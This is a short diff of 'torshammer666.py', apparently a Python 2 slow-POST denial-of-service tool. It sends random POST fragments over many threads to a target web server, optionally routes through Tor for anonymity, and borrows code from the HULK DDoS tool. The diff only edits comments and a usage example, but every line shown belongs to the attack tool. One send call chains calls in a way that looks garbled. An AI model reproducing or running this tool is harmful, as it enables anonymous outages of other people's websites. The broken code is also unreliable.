@@ -183,7 +183,7 @@ class httpPost(Thread):
         count = random.choice(counts)  # randomly sends 1-6 random data strings at a time ;)
         print term.BOL + term.UP + term.CLEAR_EOL + "Posting: %s" % count + term.NORMAL
         self.socks.send(count)(buildblock)(random.randint(3, 10)) + '=' + (buildblock)(
-            random.randint(3, 10))  # imported buildblocks str8 from hulk(ddos)
+            random.randint(3, 10))  # imported buildblocks from hulk(ddos)
         time.sleep(random.uniform(0.1, 3))
 
         self.socks.close()
@@ -222,7 +222,7 @@ def usage():
     print " -p|--port <Web Server Port> Defaults to 80"
     print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
     print " -h|--help Shows this help\n"
-    print "Eg. ./torshammer666.py -t 192.168.1.100 -r 256\n"
+    print "Eg. ./torshammer666.py -t 192.168.1.100 -r 356\n"
 
 def main(argv):
     try:
@@ -235,7 +235,7 @@ def main(argv):
     target = ''
     threads = 356
     port = 80
-    tor = False  # -____- fck who ever doesnt use TOR really... LULZ your choice
+    tor = False
 
     for o, a in opts:
         if o in ("-h", "--help"):
